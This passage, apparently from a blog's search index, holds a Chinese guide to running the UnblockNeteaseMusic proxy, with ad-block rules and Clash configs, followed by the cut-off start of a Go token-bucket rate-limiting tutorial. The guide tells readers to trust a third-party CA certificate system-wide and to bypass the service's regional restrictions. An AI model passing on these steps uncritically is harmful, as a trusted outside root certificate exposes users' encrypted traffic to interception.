ingsoft.com,REJECT\nDOMAIN,js-agent.newrelic.com,REJECT\nDOMAIN,pixel.wp.com,REJECT\nDOMAIN-SUFFIX,adjust.com,REJECT\nDOMAIN-SUFFIX,cmcore.com,REJECT\nDOMAIN-SUFFIX,coremetrics.com,REJECT\nDOMAIN-SUFFIX,flurry.com,REJECT\nDOMAIN-SUFFIX,irs01.com,REJECT\nDOMAIN-SUFFIX,madmini.com,REJECT\nDOMAIN-SUFFIX,mixpanel.com,REJECT\nDOMAIN-SUFFIX,wrating.com,REJECT\nDOMAIN-SUFFIX,admaster.com.cn,REJECT\nDOMAIN-SUFFIX,51.la,REJECT\nDOMAIN-SUFFIX,acs86.com,REJECT\nDOMAIN-SUFFIX,adchina.com,REJECT\nDOMAIN-SUFFIX,adcome.cn,REJECT\nDOMAIN-SUFFIX,adinfuse.com,REJECT\nDOMAIN-SUFFIX,admob.com,REJECT\nDOMAIN-SUFFIX,adsage.cn,REJECT\nDOMAIN-SUFFIX,adsage.com,REJECT\nDOMAIN-SUFFIX,adsmogo.org,REJECT\nDOMAIN-SUFFIX,ads.mobclix.com,REJECT\nDOMAIN-SUFFIX,adview.cn,REJECT\nDOMAIN-SUFFIX,adwhirl.com,REJECT\nDOMAIN-SUFFIX,adwo.com,REJECT\nDOMAIN-SUFFIX,ad.unimhk.com,REJECT\nDOMAIN-SUFFIX,aduu.cn,REJECT\nDOMAIN-SUFFIX,advertising.com,REJECT\nDOMAIN-SUFFIX,adxmi.com,REJECT\nDOMAIN-SUFFIX,adzerk.net,REJECT\nDOMAIN-SUFFIX,anquan.org,REJECT\nDOMAIN-SUFFIX,appads.com,REJECT\nDOMAIN-SUFFIX,applifier.com,REJECT\nDOMAIN-SUFFIX,appsflyer.com,REJECT\nDOMAIN-SUFFIX,baidustatic.com,REJECT\nDOMAIN-SUFFIX,baifendian.com,REJECT\nDOMAIN-SUFFIX,beacon.sina.com.cn,REJECT\nDOMAIN-SUFFIX,cnzz.com,REJECT\nDOMAIN-SUFFIX,domob.com.cn,REJECT\nDOMAIN-SUFFIX,domob.org,REJECT\nDOMAIN-SUFFIX,duomeng.cn,REJECT\nDOMAIN-SUFFIX,duomeng.net,REJECT\nDOMAIN-SUFFIX,duomeng.org,REJECT\nDOMAIN-SUFFIX,googeadsserving.cn,REJECT\nDOMAIN-SUFFIX,guomob.com,REJECT\nDOMAIN-SUFFIX,inmobi.com,REJECT\nDOMAIN-SUFFIX,immob.cn,REJECT\nDOMAIN-SUFFIX,intely.cn,REJECT\nDOMAIN-SUFFIX,kejet.net,REJECT\nDOMAIN-SUFFIX,localytics.com,REJECT\nDOMAIN-SUFFIX,mobads.baidu.com,REJECT\nDOMAIN-SUFFIX,mobads-logs.baidu.com,REJECT\nDOMAIN-SUFFIX,smartadserver.com,REJECT\nDOMAIN-SUFFIX,tapjoyads.com,REJECT\nDOMAIN-SUFFIX,m.simaba.taobao.com,REJECT\nDOMAIN-SUFFIX,mmstat.com,REJECT\nDOMAIN-SUFFIX,sax.sina.cn,REJECT\nDOMAIN-SUFFIX,tanx.com,REJECT\nDOMAIN-SUFFIX,tiqcdn.com,REJECT\nDOMAIN-SUFFIX,umtrack.com,REJECT\nDOMAIN-SUFFIX,umeng.co,REJECT\nDOMAIN-SUFFIX,umeng.com,REJECT\nDOMAIN-SUFFIX,umeng.net,REJECT\nDOMAIN-SUFFIX,ushaqi.com,REJECT\nDOMAIN-SUFFIX,uyunad.com,REJECT\nDOMAIN-SUFFIX,waps.cn,REJECT\nDOMAIN-SUFFIX,wiyun.com,REJECT\nDOMAIN-SUFFIX,wooboo.com.cn,REJECT\nDOMAIN-SUFFIX,wqmobile.com,REJECT\nDOMAIN-SUFFIX,youmi.net,REJECT\nDOMAIN-SUFFIX,zhiziyun.com,REJECT\nDOMAIN-SUFFIX,data.vod.itc.cn,REJECT\nDOMAIN-SUFFIX,atm.youku.com,REJECT\nDOMAIN,ad.api.3g.youku.com,REJECT\nDOMAIN,ad.api.3g.tudou.com,REJECT\nDOMAIN,monitor.uu.qq.com,REJECT\nDOMAIN,pingjs.qq.com,REJECT\nDOMAIN,pingma.qq.com,REJECT\nDOMAIN,tajs.qq.com,REJECT\nDOMAIN-SUFFIX,pingtcss.qq.com,REJECT\nDOMAIN-SUFFIX,report.qq.com,REJECT\nDOMAIN,mi.gdt.qq.com,REJECT\nDOMAIN,dsp.youdao.com,REJECT\nDOMAIN,g.163.com,REJECT\nDOMAIN,temp.163.com,REJECT\nDOMAIN-SUFFIX,stat.ws.126.net,REJECT\nDOMAIN-SUFFIX,analytics.126.net,DIRECT\nDOMAIN-SUFFIX,union.youdao.com,REJECT\nDOMAIN,msga.71.am,REJECT\nDOMAIN-SUFFIX,miaozhen.com,REJECT\nDOMAIN,cr-nielsen.com,REJECT\nDOMAIN,cbjs.baidu.com,REJECT\nDOMAIN,cpro.baidu.com,REJECT\nDOMAIN,eclick.baidu.com,REJECT\nDOMAIN,msg.71.am,REJECT\nDOMAIN,mtj.baidu.com,REJECT\nDOMAIN,nsclick.baidu.com,REJECT\nDOMAIN-SUFFIX,pos.baidu.com,REJECT\nDOMAIN-SUFFIX,baidu.com,DIRECT\nIP-CIDR,60.210.17.12/24,REJECT\nDOMAIN,acjs.aliyun.com,REJECT\nDOMAIN,adash.m.taobao.com,REJECT\nDOMAIN-SUFFIX,simaba.taobao.com,REJECT\nDOMAIN-SUFFIX,taobao.com,DIRECT\nDOMAIN-SUFFIX,alicdn.com,DIRECT\nDOMAIN,ads.mopub.com,REJECT\nDOMAIN,ark.letv.com,REJECT\nDOMAIN,asimgs.pplive.cn,REJECT\nDOMAIN,csi.gstatic.com,REJECT\nDOMAIN,iadsdk.apple.com,REJECT\nDOMAIN,pagead2.googlesyndication.com,REJECT\nIP-CIDR,221.179.140.0/24,REJECT\nDOMAIN-SUFFIX,www.panoramio.com,REJECT\nDOMAIN-SUFFIX,qq.com,DIRECT\nDOMAIN-KEYWORD,alipay,DIRECT\nDOMAIN-KEYWORD,360buy,DIRECT\nDOMAIN-SUFFIX,jd.com,DIRECT\nDOMAIN-SUFFIX,126.net,DIRECT\nDOMAIN-SUFFIX,163.com,DIRECT\nDOMAIN-SUFFIX,amap.com,DIRECT\nDOMAIN-SUFFIX,bdimg.com,DIRECT\nDOMAIN-SUFFIX,bdstatic.com,DIRECT\nDOMAIN-SUFFIX,cnbeta.com,DIRECT\nDOMAIN-SUFFIX,douban.com,DIRECT\nDOMAIN-SUFFIX,gtimg.com,DIRECT\nDOMAIN-SUFFIX,hao123.com,DIRECT\nDOMAIN-SUFFIX,haosou.com,DIRECT\nDOMAIN-SUFFIX,ifeng.com,DIRECT\nDOMAIN-SUFFIX,iqiyi.com,DIRECT\nDOMAIN-SUFFIX,netease.com,DIRECT\nDOMAIN-SUFFIX,qhimg.com,DIRECT\nDOMAIN-SUFFIX,sogou.com,DIRECT\nDOMAIN-SUFFIX,sohu.com,DIRECT\nDOMAIN-SUFFIX,soso.com,DIRECT\nDOMAIN-SUFFIX,suning.com,DIRECT\nDOMAIN-SUFFIX,tmall.com,DIRECT\nDOMAIN-SUFFIX,tudou.com,DIRECT\nDOMAIN-SUFFIX,youku.com,DIRECT\nDOMAIN-SUFFIX,xunlei.com,DIRECT\nDOMAIN-SUFFIX,zhihu.com,DIRECT\nDOMAIN-SUFFIX,ls.apple.com,DIRECT\nDOMAIN-SUFFIX,weather.com,DIRECT\nDOMAIN-SUFFIX,weibo.cn,DIRECT\nDOMAIN-SUFFIX,weibo.com,DIRECT\nDOMAIN-SUFFIX,sinaimg.cn,DIRECT\nDOMAIN-SUFFIX,goodread.com,DIRECT\nDOMAIN-KEYWORD,aka,PROXY\nDOMAIN,me.com,PROXY\nDOMAIN-SUFFIX,.me.com,PROXY\nDOMAIN-SUFFIX,amazonaws.com,PROXY\nDOMAIN-SUFFIX,android.com,PROXY\nDOMAIN-SUFFIX,angularjs.org,PROXY\nDOMAIN-SUFFIX,appspot.com,PROXY\nDOMAIN-SUFFIX,akamaihd.net,PROXY\nDOMAIN-SUFFIX,amazon.com,PROXY\nDOMAIN-SUFFIX,bit.ly,PROXY\nDOMAIN-SUFFIX,bitbucket.org,PROXY\nDOMAIN-SUFFIX,blog.com,PROXY\nDOMAIN-SUFFIX,blogcdn.com,PROXY\nDOMAIN-SUFFIX,blogger.com,PROXY\nDOMAIN-SUFFIX,blogsmithmedia.com,PROXY\nDOMAIN-SUFFIX,box.net,PROXY\nDOMAIN-SUFFIX,bloomberg.com,PROXY\nDOMAIN-SUFFIX,chromium.org,PROXY\nDOMAIN-SUFFIX,cl.ly,PROXY\nDOMAIN-SUFFIX,cloudfront.net,PROXY\nDOMAIN-SUFFIX,cloudflare.com,PROXY\nDOMAIN-SUFFIX,cocoapods.org,PROXY\nDOMAIN-SUFFIX,crashlytics.com,PROXY\nDOMAIN-SUFFIX,dribbble.com,PROXY\nDOMAIN-SUFFIX,dropbox.com,PROXY\nDOMAIN-SUFFIX,dropboxstatic.com,PROXY\nDOMAIN-SUFFIX,dropboxusercontent.com,PROXY\nDOMAIN-SUFFIX,docker.com,PROXY\nDOMAIN-SUFFIX,duckduckgo.com,PROXY\nDOMAIN-SUFFIX,digicert.com,PROXY\nDOMAIN-SUFFIX,dnsimple.com,PROXY\nDOMAIN-SUFFIX,edgecastcdn.net,PROXY\nDOMAIN-SUFFIX,engadget.com,PROXY\nDOMAIN-SUFFIX,eurekavpt.com,PROXY\nDOMAIN-SUFFIX,fb.me,PROXY\nDOMAIN-SUFFIX,fbcdn.net,PROXY\nDOMAIN-SUFFIX,fc2.com,PROXY\nDOMAIN-SUFFIX,feedburner.com,PROXY\nDOMAIN-SUFFIX,fabric.io,PROXY\nDOMAIN-SUFFIX,flickr.com,PROXY\nDOMAIN-SUFFIX,fastly.net,PROXY\nDOMAIN-SUFFIX,ggpht.com,PROXY\nDOMAIN-SUFFIX,github.com,PROXY\nDOMAIN-SUFFIX,github.io,PROXY\nDOMAIN-SUFFIX,githubusercontent.com,PROXY\nDOMAIN-SUFFIX,golang.org,PROXY\nDOMAIN-SUFFIX,goo.gl,PROXY\nDOMAIN-SUFFIX,gstatic.com,PROXY\nDOMAIN-SUFFIX,godaddy.com,PROXY\nDOMAIN-SUFFIX,gravatar.com,PROXY\nDOMAIN-SUFFIX,imageshack.us,PROXY\nDOMAIN-SUFFIX,imgur.com,PROXY\nDOMAIN-SUFFIX,jshint.com,PROXY\nDOMAIN-SUFFIX,ift.tt,PROXY\nDOMAIN-SUFFIX,j.mp,PROXY\nDOMAIN-SUFFIX,kat.cr,PROXY\nDOMAIN-SUFFIX,linode.com,PROXY\nDOMAIN-SUFFIX,linkedin.com,PROXY\nDOMAIN-SUFFIX,licdn.com,PROXY\nDOMAIN-SUFFIX,lithium.com,PROXY\nDOMAIN-SUFFIX,megaupload.com,PROXY\nDOMAIN-SUFFIX,mobile01.com,PROXY\nDOMAIN-SUFFIX,modmyi.com,PROXY\nDOMAIN-SUFFIX,nytimes.com,PROXY\nDOMAIN-SUFFIX,name.com,PROXY\nDOMAIN-SUFFIX,openvpn.net,PROXY\nDOMAIN-SUFFIX,openwrt.org,PROXY\nDOMAIN-SUFFIX,ow.ly,PROXY\nDOMAIN-SUFFIX,pinboard.in,PROXY\nDOMAIN-SUFFIX,ssl-images-amazon.com,PROXY\nDOMAIN-SUFFIX,sstatic.net,PROXY\nDOMAIN-SUFFIX,stackoverflow.com,PROXY\nDOMAIN-SUFFIX,staticflickr.com,PROXY\nDOMAIN-SUFFIX,squarespace.com,PROXY\nDOMAIN-SUFFIX,symcd.com,PROXY\nDOMAIN-SUFFIX,symcb.com,PROXY\nDOMAIN-SUFFIX,symauth.com,PROXY\nDOMAIN-SUFFIX,ubnt.com,PROXY\nDOMAIN-SUFFIX,thepiratebay.org,PROXY\nDOMAIN-SUFFIX,tumblr.com,PROXY\nDOMAIN-SUFFIX,twitch.tv,PROXY\nDOMAIN-SUFFIX,twitter.com,PROXY\nDOMAIN-SUFFIX,wikipedia.com,PROXY\nDOMAIN-SUFFIX,wikipedia.org,PROXY\nDOMAIN-SUFFIX,wikimedia.org,PROXY\nDOMAIN-SUFFIX,wordpress.com,PROXY\nDOMAIN-SUFFIX,wsj.com,PROXY\nDOMAIN-SUFFIX,wsj.net,PROXY\nDOMAIN-SUFFIX,wp.com,PROXY\nDOMAIN-SUFFIX,vimeo.com,PROXY\nDOMAIN-SUFFIX,youtu.be,PROXY\nDOMAIN-SUFFIX,ytimg.com,PROXY\nDOMAIN-KEYWORD,blogspot,PROXY\nDOMAIN-SUFFIX,tapbots.com,PROXY\nDOMAIN-SUFFIX,ykimg.com,DIRECT\nDOMAIN-SUFFIX,medium.com,PROXY\nDOMAIN-SUFFIX,fast.com,PROXY\nDOMAIN-SUFFIX,nflxvideo.net,PROXY\nDOMAIN-SUFFIX,clashroyaleapp.com,DIRECT\nDOMAIN-SUFFIX,bilibili.com,DIRECT\nDOMAIN-SUFFIX,bilibili.cn,DIRECT\nDOMAIN-SUFFIX,acgvideo.com,DIRECT\nDOMAIN-SUFFIX,jianshu.com,DIRECT\nDOMAIN-SUFFIX,jianshu.io,DIRECT\nDOMAIN-SUFFIX,jianshuapi.com,DIRECT\nDOMAIN-SUFFIX,soundcloud.com,PROXY\nDOMAIN-SUFFIX,sndcdn.com,PROXY\nDOMAIN-SUFFIX,outlook.com,DIRECT\nIP-CIDR,91.108.56.0/22,PROXY,no-resolve\nIP-CIDR,91.108.4.0/22,PROXY,no-resolve\nIP-CIDR,109.239.140.0/24,PROXY,no-resolve\nIP-CIDR,149.154.160.0/20,PROXY,no-resolve\nIP-CIDR,192.168.0.0/16,DIRECT\nIP-CIDR,10.0.0.0/8,DIRECT\nIP-CIDR,172.16.0.0/12,DIRECT\nIP-CIDR,127.0.0.0/8,DIRECT\nGEOIP,CN,DIRECT\nDOMAIN-SUFFIX,music.126.net,PROXY\nDOMAIN-SUFFIX,music.163.com,PROXY\nDOMAIN-SUFFIX,api.iplay.163.com,PROXY\nDOMAIN-SUFFIX,mam.netease.com,PROXY\nDOMAIN-SUFFIX,hz.netease.com,PROXY\nUSER-AGENT,%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90*,PROXY\nUSER-AGENT,NeteaseMusic*,PROXY\nFINAL,PROXY\n\n[Host]\nlocalhost = 127.0.0.1\n\n[URL Rewrite]\n^http://(www.)?g.cn https://www.google.com 302\n^http://(www.)?google.cn https://www.google.com 302\n^http://reject.example.com reject \n```\n\n\n\n### 2.2 mac使用\n\n+ 下载clashX最新版本的安装包   https://github.com/yichengchen/clashX/releases\n\n+ 下载music.yaml配置文件到本地   http://files.liuvv.com/music.yaml\n\n+ clashX->配置->打开配置文件夹-> 把music.yaml放到文件夹里, 选择并启动代理\n\n+ 下载最新证书 （去项目里下载最新的） 双击安装到系统钥匙链上, 并设置始终信任\n\n+ 打开网易云音乐,搜索周杰伦, 播放\n\n> clashX 可以用系统代理替代。在系统偏好设置里, 网络->wifi->代理->自动代理配置里, 填写 url  `http://公网ip:8080/proxy.pac`\n\n```yml\nport: 7890\nsocks-port: 7891\nallow-lan: false\nmode: Rule\nlog-level: silent\nexternal-controller: 127.0.0.1:9090\n\ndns:\n  enable: true\n  listen: 0.0.0.0:53\n  enhanced-mode: fake-ip\n  nameserver:\n   - 119.29.29.29\n   - 223.5.5.5\n\nProxy:\n- name: \"UnblockMusic\"\n  type: http\n  server: #你的公网IP\n  port: 8080\n\nProxy Group:\n- name: \"Netease Music\"\n  type: select\n  proxies: \n    - UnblockMusic\n    - DIRECT\n\nRule:\n# Unblock Netease Music\n- DOMAIN,api.iplay.163.com,Netease Music\n- DOMAIN,apm3.music.163.com,Netease Music\n- DOMAIN,apm.music.163.com,Netease Music\n- DOMAIN,interface3.music.163.com,Netease Music\n- DOMAIN,interface.music.163.com,Netease Music\n- DOMAIN,music.163.com,Netease Music\n- DOMAIN,music.126.net,Netease Music\n- DOMAIN-SUFFIX,163yun.com,Netease Music\n- DOMAIN-SUFFIX,mam.netease.com,Netease Music\n- DOMAIN-SUFFIX,hz.netease.com,Netease Music\n\n# CIDR规则\n- IP-CIDR,39.105.63.80/32,Netease Music\n- IP-CIDR,45.254.48.1/32,Netease Music\n- IP-CIDR,47.100.127.239/32,Netease Music\n- IP-CIDR,59.111.160.195/32,Netease Music\n- IP-CIDR,59.111.160.197/32,Netease Music\n- IP-CIDR,59.111.181.35/32,Netease Music\n- IP-CIDR,59.111.181.38/32,Netease Music\n- IP-CIDR,59.111.181.60/32,Netease Music\n- IP-CIDR,101.71.154.241/32,Netease Music\n- IP-CIDR,103.126.92.132/32,Netease Music\n- IP-CIDR,103.126.92.133/32,Netease Music\n- IP-CIDR,112.13.119.17/32,Netease Music\n- IP-CIDR,112.13.122.1/32,Netease Music\n- IP-CIDR,115.236.118.33/32,Netease Music\n- IP-CIDR,115.236.121.1/32,Netease Music\n- IP-CIDR,118.24.63.156/32,Netease Music\n- IP-CIDR,193.112.159.225/32,Netease Music\n- IP-CIDR,223.252.199.66/32,Netease Music\n- IP-CIDR,223.252.199.67/32,Netease Music\n- IP-CIDR,59.111.21.14/31,Netease Music\n- IP-CIDR,59.111.179.214/32,Netease Music\n- IP-CIDR,59.111.238.29/32,Netease Music\n\n# Advertising\n- DOMAIN,admusicpic.music.126.net,REJECT\n- DOMAIN,iadmat.nosdn.127.net,REJECT\n- DOMAIN,iadmusicmat.music.126.net,REJECT\n- DOMAIN,iadmusicmatvideo.music.126.net,REJECT\n\n# Final\n- MATCH,DIRECT\n```\n\n\n\n###  2.3 android使用\n\n+ 下载clashX最新版本的apk\n\n​\thttps://github.com/Kr328/ClashForAndroid/releases\n\n   点开 Assets下载 app-universal-release.apk\n\n+ 打开软件，点击配置文件->新的配置文件->统一资源定位地址\n\n​\t名称随便写, 下方的统一资源定位地址填写http://files.liuvv.com/music.yaml\n\n+ 回到主界面开启代理\n\n+ 打开网易云音乐,搜索周杰伦, 播放\n\n  \n\n### 2.4 windows使用\n\n+ 打开网易云音乐,右上角齿轮->工具->http代理->自定义代理->http代理。  服务器和端口号填写自己部署的服务器公网IP和端口。\n\n+ 确定重启网易云\n\n+ 搜索周杰伦, 播放\n\n\n\n\n\n\n# 3. ~~使用（废弃、请看2023更新）~~\n\n### 3.1 ios 使用\n\n教程散落在这个 issue  https://github.com/nondanee/UnblockNeteaseMusic/issues/65\n\n+ 去美区 appstore, 下载个小火箭\n\n- 右上角加号添加节点\n- 类型选择 HTTP\n- 服务器填写你的服务器公网 IP\n- 端口填写你启动服务的端口号（默认为 8080）\n- 然后底部找到配置 点击本地文件 -> default.conf -> 编辑配置\n- 添加三条规则 选项选择你刚刚添加的节点\n  - `USER-AGENT`: `NeteaseMusic*`\n  - `DOMAIN-SUFFIX`: `163.com`\n  - `DOMAIN-SUFFIX`: `126.net`\n\n+ 打开网易云, 搜索周杰伦\n\n\n\n### 3.2 mac 使用\n\nmac 因为最新版本的原因(我的版本2.3.2 (832)),  需要通过自签证书解决https 请求.\n\n教程散落在这个 issue https://github.com/nondanee/UnblockNeteaseMusic/issues/48\n\n1. 安装仓库内的 CA证书到系统钥匙链\n\n   `https://github.com/nondanee/UnblockNeteaseMusic/blob/master/ca.crt`\n\n   钥匙串->登录->UnblockNetease->始终信任. \n\n2. 在系统偏好设置里, 网络->wifi->代理->自动代理配置里, 填写 url  `http://公网ip:8080/proxy.pac`\n\n3. 打开网易云, 搜索周杰伦\n\n4. 可选代理软件\n\n   在 mac下, 虽然可以通过系统偏好设置代理达到目的, 但还是建议走代理软件.  我用的是 clashX, 先上 mac 的 clashX 配置\n\n   `music.yaml` 注意修改下面的 公网 ip 为服务器的\n\n```yaml\nport: 7890\nsocks-port: 7891\nallow-lan: false\nmode: Rule\nlog-level: silent\nexternal-controller: 127.0.0.1:9090\n\ndns:\n  enable: true\n  listen: 0.0.0.0:53\n  enhanced-mode: fake-ip\n  nameserver:\n   - 119.29.29.29\n   - 223.5.5.5\n\nProxy:\n- name: \"UnblockMusic\"\n  type: http\n  server: 公网ip\n  port: 8080\n\nProxy Group:\n- name: \"Netease Music\"\n  type: select\n  proxies: \n    - UnblockMusic\n    - DIRECT\n\nRule:\n# Unblock Netease Music\n- DOMAIN,api.iplay.163.com,Netease Music\n- DOMAIN,apm3.music.163.com,Netease Music\n- DOMAIN,apm.music.163.com,Netease Music\n- DOMAIN,interface3.music.163.com,Netease Music\n- DOMAIN,interface.music.163.com,Netease Music\n- DOMAIN,music.163.com,Netease Music\n- DOMAIN,music.126.net,Netease Music\n- DOMAIN-SUFFIX,163yun.com,Netease Music\n- DOMAIN-SUFFIX,mam.netease.com,Netease Music\n- DOMAIN-SUFFIX,hz.netease.com,Netease Music\n\n# CIDR规则\n- IP-CIDR,39.105.63.80/32,Netease Music\n- IP-CIDR,45.254.48.1/32,Netease Music\n- IP-CIDR,47.100.127.239/32,Netease Music\n- IP-CIDR,59.111.160.195/32,Netease Music\n- IP-CIDR,59.111.160.197/32,Netease Music\n- IP-CIDR,59.111.181.35/32,Netease Music\n- IP-CIDR,59.111.181.38/32,Netease Music\n- IP-CIDR,59.111.181.60/32,Netease Music\n- IP-CIDR,101.71.154.241/32,Netease Music\n- IP-CIDR,103.126.92.132/32,Netease Music\n- IP-CIDR,103.126.92.133/32,Netease Music\n- IP-CIDR,112.13.119.17/32,Netease Music\n- IP-CIDR,112.13.122.1/32,Netease Music\n- IP-CIDR,115.236.118.33/32,Netease Music\n- IP-CIDR,115.236.121.1/32,Netease Music\n- IP-CIDR,118.24.63.156/32,Netease Music\n- IP-CIDR,193.112.159.225/32,Netease Music\n- IP-CIDR,223.252.199.66/32,Netease Music\n- IP-CIDR,223.252.199.67/32,Netease Music\n- IP-CIDR,59.111.21.14/31,Netease Music\n- IP-CIDR,59.111.179.214/32,Netease Music\n- IP-CIDR,59.111.238.29/32,Netease Music\n\n# Advertising\n- DOMAIN,admusicpic.music.126.net,REJECT\n- DOMAIN,iadmat.nosdn.127.net,REJECT\n- DOMAIN,iadmusicmat.music.126.net,REJECT\n- DOMAIN,iadmusicmatvideo.music.126.net,REJECT\n\n# Final\n- MATCH,DIRECT\n```\n\n启动这个配置再打开网易云, 加载速度就会特别丝滑. \n\n但是大多数情况下需要一边上网一边听歌, 所以只需要把上面这个 Rule 规则合并你规则里即可. 因为有规则优先级的顺序问题, 需要把上述 Rule 配置放到自己的 Rule 配置前面.\n\n\n\n### 3.3 windows使用\n\nwindows 和 ios 不通用, 可以开启两个进程, 监听不同的端口\n\nhttps://github.com/nondanee/UnblockNeteaseMusic/issues/478\n\n\n\n# 4. 参考资料\n\n+ https://github.com/nondanee/UnblockNeteaseMusic\n+ https://www.yfriend.xyz/155.html","tags":["音乐"],"categories":["使用软件"]},{"title":"令牌桶算法和golang的http限流实战","url":"%2Fp%2F1acf08ad.html","content":"\n限流就是通过对并发访问 / 请求进行限速，或者对一个时间窗口内的请求进行限速来保护系统，一旦达到限制速率则可以拒绝服务、排队或等待、降级等处理。\n\n例如秒杀网站，限制 22 点 5 分 – 22 点 10 分 秒杀 999 份产品， 限制放行 5w 个请求，若在该段时间内，请求在第 5w 以后的请求，直接拒之门外， 也就是我们在进入网站的时候显示，系统繁忙。\n\n<!-- more -->\n\n# 1. 常见限流算法\n\n### 1.1 固定时间窗口控制\n\n最简单的是 使用计数器来控制，设置固定的时间内，处理固定的请求数。\n\n<img src=\"令牌桶算法和golang的http限流实战/wPhrOAKBMa.png\" alt=\"img\" style=\"zoom:100%;\" />\n\n### 1.2 滑动窗口计数器算法\n\n能够去平滑一下处理的任务数量。滑动窗口计数器是通过将窗口再细分，并且按照时间滑动，这种算法避免了固定窗口算法带来的双倍突发请求，但时间区间精度越高，算法所需的空间容量越大。\n\n![img](令牌桶算法和golang的http限流实战/V4wCxMzm6J.png)\n\n### 1.3 漏桶算法\n\n漏桶是有缓存的，有请求就会放到缓存中。漏桶以固定的速率往外漏水，若桶空了则停止漏水。比如说，1s 漏 1000 滴水，正如 1s 处理 1000 个请求。如果漏桶慢了，则多余的水滴也会被直接舍弃。\n\n<img src=\"令牌桶算法和golang的http限流实战/HmgdCAM2FX.png\" alt=\"img\" style=\"zoom:67%;\" />\n\n如图，水滴即为请求的事件，如果漏桶可以缓存 5000 个事件，实际服务器 1s 处理 1000 个事件，那么在高峰期的时候，响应时间最多等 5 秒，但是不能一直是高峰期，否则，一直响应时间都是 5s，就会是很慢的时间了，这个时间也是很影响体验的。\n\n如果桶满了，**还有请求过来的话，则会被直接丢弃**，这种做法，还是丢弃了请求。\n\n###  1.4 令牌桶算法\n\n通过动态控制令牌的数量，来更好的服务客户端的请求事情，令牌的生成数量和生产速率都是可以灵活控制的\n\n\n\n<img src=\"令牌桶算法和golang的http限流实战/K5LsU6XNKy.png\" alt=\"img\" style=\"zoom:67%;\" />\n\n**令牌桶和漏桶不同的地方在于**令牌桶可以自己控制生成令牌的速率，例如高峰期就可以多生成一些令牌来满足客户端的需求。\n\n令牌桶实现的限流器算法，相较于漏桶算法可以在一定程度上允许突发的流量进入我们的应用中，所以在web应用中最为广泛。\n\n\n\n# 2. golang的令牌桶库\n\ngolang 标准库中就自带了限流算法的实现，`golang.org/x/time/rate`，该限流器是基于 Token Bucket (令牌桶) 实现的。\n\n令牌桶就是我们上面说的桶，里面装令牌，系统会以恒定速率向桶中放令牌，桶满则暂时不放。 用户请求就要向桶里面拿令牌。\n\n### 2.1 创建令牌桶\n\n```go\nfunc NewLimiter(r Limit, b int) *Limiter {\n\treturn &Limiter{\n\t\tlimit: r,\n\t\tburst: b,\n\t}\n}\n\nlimiter := NewLimiter(5, 1);\n```\n\n- 第一个参数是 r Limit，这是代表每秒可以向**令牌桶**中产生多少令牌\n- 第二个参数是 b int，这是代表**令牌桶**的容量大小\n\n​\t\n\n我们来看一个案例：\n\n```go\npackage main\n\nimport (\n    \"context\"\n    \"log\"\n    \"time\"\n\n    \"golang.org/x/time/rate\"\n)\n\n\nfunc main() {\n\tl := rate.NewLimiter(1, 2) // 一秒放1个，最多寸2个令牌。\n\tfor i := 0; i < 50; i++ {\n\n\t\tc, _ := context.WithTimeout(context.Background(), time.Second*2)\n\t\tif err := l.Wait(c); err != nil {\n\t\t\tlog.Println(\"limiter wait error : \" + err.Error())\n\t\t}\n\t\tlog.Println(\"Wait success:\", i)\n\n\t\t// Reserve返回等待时间，再去取令牌\n\t\tr := l.Reserve()\n\t\tlog.Println(\"reserve time :\", r.Delay())\n\n\t\t// Allow判断当前是否可以取到令牌\n\t\ta := l.Allow()\n\t\tlog.Println(\"Allow == \", a)\n\t}\n}\n\n```\n\n\n\n### 2.2 令牌桶消费函数\n\n##### Wait （阻塞等待）\n\nWait ，等于 WaitN(ctx,1)\n\n若此时桶内令牌数组不足 (小于N)，那么 Wait 方法将会阻塞一段时间，直至令牌满足条件，否则就一直阻塞，若满足条件，则直接返回结果。Wait 的 context 参数，可以设置超时时间。\n\n\n\n\n```go\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3) // 1秒1个，最多3个\n\n\tc, _ := context.WithCancel(context.TODO())\n\tfor {\n\t\tl.WaitN(c, 1)\n\t\tfmt.Println(time.Now().Format(\"2006-01-02 15:04:05\"))\n\t}\n}\n\n\n2023-09-11 17:02:13\n2023-09-11 17:02:13\n2023-09-11 17:02:13  // 拿完3个后，再阻塞了\n2023-09-11 17:02:14\n2023-09-11 17:02:15\n2023-09-11 17:02:16\n2023-09-11 17:02:17\n```\n\n\n\n##### Allow （立马返回）\n\n`Allow` 等于 `AllowN(time.Now(),1)`， 当前取一个令牌，若满足，则为 true，否则 false。\n\n`AllowN` 方法 指的是，截止到某一时刻，目前桶中令牌数目是否至少为 N 个，满足则返回 true，同时从桶中消费 N 个令牌。 反之返回不消费令牌，返回 false\n\n如果你需要在事件超出频率的时候丢弃或跳过事件，就使用AllowN，否则使用 Reserve 或Wait。\n\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3)\n\n\tfor {\n\t\tif l.AllowN(time.Now(), 1) {\n\t\t\tfmt.Println(\"ok\", time.Now().Format(\"2006-01-02 15:04:05\"))\n\t\t} else {\n\t\t\ttime.Sleep(time.Second / 3)\n\t\t\tfmt.Println(\"false\", time.Now().Format(\"2006-01-02 15:04:05\"))\n\t\t}\n\t}\n}\n\n\nok 2023-09-11 17:07:53\nok 2023-09-11 17:07:53\nok 2023-09-11 17:07:53\nfalse 2023-09-11 17:07:53\nfalse 2023-09-11 17:07:54\nfalse 2023-09-11 17:07:54\nok 2023-09-11 17:07:54\nfalse 2023-09-11 17:07:54\nfalse 2023-09-11 17:07:55\nfalse 2023-09-11 17:07:55\nok 2023-09-11 17:07:55\nfalse 2023-09-11 17:07:55\nfalse 2023-09-11 17:07:56\nfalse 2023-09-11 17:07:56\nok 2023-09-11 17:07:56\nfalse 2023-09-11 17:07:56\nfalse 2023-09-11 17:07:57\nfalse 2023-09-11 17:07:57\n```\n\n##### Reserve （自己控制）\n\n`Reserve` ， 等于 `ReserveN(time.Now(), 1)\n\n\n`ReserveN` 当调用完成后，无论令牌是否充足，都会返回一个 Reservation * 对象\n\n我们可以调用该对象的 Delay() 方法，该方法返回了需要等待的时间。如果等待时间为 0 秒，则说明不用等待，若大于 0 秒，则必须等到等待时间之后，才能向后进行。\n当然，若不想等待，你可以归还令牌，一个都不能少，调用该对象的 Cancel() 方法即可。\n\n\n```go\npackage main\n\nimport 